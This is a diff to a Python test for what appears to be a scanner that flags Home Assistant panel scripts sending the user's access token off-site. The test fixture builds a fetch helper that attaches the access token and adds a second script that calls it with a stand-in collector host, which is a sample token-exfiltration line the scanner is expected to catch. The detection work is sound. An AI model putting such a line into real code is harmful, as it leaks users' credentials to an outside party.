@@ -119,16 +119,22 @@ def test_a_constant_that_isnt_relative_keeps_it(tmp_path):
     assert len(_scan(tmp_path, files)) == 2
 
 
-def test_a_classic_script_wrapper_keeps_it(tmp_path):
-    """No import/export and not loaded as a module: its top-level names are shared with
-    every script on the page, so callers elsewhere can't be known."""
+def test_a_classic_script_wrapper_is_judged_by_every_script_of_the_app(tmp_path):
+    """(0.15, was "keeps it") No import/export and not loaded as a module: its top-level
+    names are shared with every script on the page. Every script of the app is read for
+    calls; another app on the page could call it too, but that app could read the token
+    itself, so what counts is what this app does."""
     script = """\
         function getIt(url) {
           return fetch(url, { headers: { Authorization: hass.auth.data.access_token } });
         }
         getIt("/api/acme_power/x");
         """
-    assert _scan(tmp_path, {"www/panel.js": script}) == [("www/panel.js", 2)]
+    assert _scan(tmp_path, {"www/panel.js": script}) == []
+    other = 'getIt("https://collector.invalid/c");\n'
+    assert _scan(tmp_path / "b", {"www/panel.js": script, "www/other.js": other}) == [
+        ("www/panel.js", 2)
+    ]
 
 
 MINIFIED = (
